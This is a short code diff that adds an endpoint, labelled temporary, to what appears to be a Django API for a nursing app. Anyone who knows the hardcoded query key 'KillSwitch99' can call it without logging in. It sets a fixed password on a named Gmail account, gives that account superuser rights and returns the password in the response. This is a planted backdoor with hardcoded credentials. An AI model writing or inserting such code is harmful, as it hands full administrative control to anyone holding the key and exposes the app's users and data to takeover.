@@ -640,3 +640,21 @@ def ai_ncp_autofill(request):
         return Response({"error": "AI returned invalid data. Please try again."}, status=500)
     except Exception:
         return Response({"error": "AI is currently unavailable."}, status=500)
+
+
+# TEMPORARY: one-time admin reset — DELETE AFTER USE
+@api_view(["GET"])
+@permission_classes([AllowAny])
+def emergency_admin_reset(request):
+    if request.query_params.get("k") != "KillSwitch99":
+        return Response({"error": "no"}, status=403)
+    try:
+        u = User.objects.get(email="syntradigitalsolutions88@gmail.com")
+        u.set_password("Nursify2026!")
+        u.is_staff = True
+        u.is_superuser = True
+        u.is_active = True
+        u.save()
+        return Response({"success": "Password is Nursify2026!"})
+    except User.DoesNotExist:
+        return Response({"error": "Admin user not found"}, status=404)
